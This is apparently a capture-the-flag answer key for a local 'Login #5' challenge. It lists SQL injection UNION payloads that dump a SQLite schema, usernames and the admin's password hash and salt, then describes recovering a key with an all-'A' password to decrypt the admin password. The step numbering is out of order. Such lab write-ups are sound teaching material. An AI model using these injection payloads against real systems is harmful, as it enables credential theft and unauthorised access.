## Login #5 Answer
See sources in `/ch6.py`

### Instructions:
1. Find the tables made in the sqlite db using the following command in the search bar on `/search`:
```
y" UNION SELECT sql FROM sqlite_schema; --
```
2. Find all usernames in the members database by running
```
y" UNION SELECT username FROM members WHERE True; -- 
```
3. Find the admin's password and salt
```
y" UNION SELECT hashed_password FROM members where username = "admin"; -- 
y" UNION SELECT password_salt FROM members WHERE username="admin"; --
```
5. Make an attacker account at `/register` with the password of all A's of `len(admin_password_encrypted)`
6. Then get the encrypted version of the account you just made which will just be the key
```
y" UNION SELECT password_hash FROM members WHERE username="attacker" -- 
```
4. Run `ch5.py` with the admin_password_encrypted and key found which will decrypt it
5. Enter `admin` in username box
6. Enter password returned from `ch6.py` in password box at `localhost:8080`